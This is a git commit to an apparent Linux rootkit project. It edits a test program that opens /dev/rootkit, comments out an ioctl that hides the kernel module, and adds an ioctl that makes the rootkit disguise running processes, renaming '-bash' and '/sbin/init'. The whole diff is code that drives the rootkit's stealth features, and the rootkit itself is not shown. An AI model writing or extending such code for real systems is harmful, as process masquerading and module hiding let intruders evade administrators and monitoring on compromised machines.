3bef7d982e20d0af8c9a8d0a4749ebfb3246b11a
xuan <s986309@gmail.com>
2022-03-10 19:54:02 +0800

    Add test of masquerade process name.

--- test.c
+++ test.c
@@ -5,5 +5,19 @@
 
 int main (void) {
     int fd = open("/dev/rootkit", O_RDWR);
-    ioctl(fd, IOCTL_MOD_HIDE);
+    // ioctl(fd, IOCTL_MOD_HIDE);
+
+    struct masq_proc masq[2] = {
+        {.orig_name = "-bash",
+         .new_name  = "-fish"},
+        {.orig_name = "/sbin/init",
+         .new_name  = "QQAAQQQ"},
+    };
+
+    struct masq_proc_req masq_req = {
+        .len = 2,
+        .list = masq,
+    };
+
+    ioctl(fd, IOCTL_MOD_MASQ, &masq_req);
 }
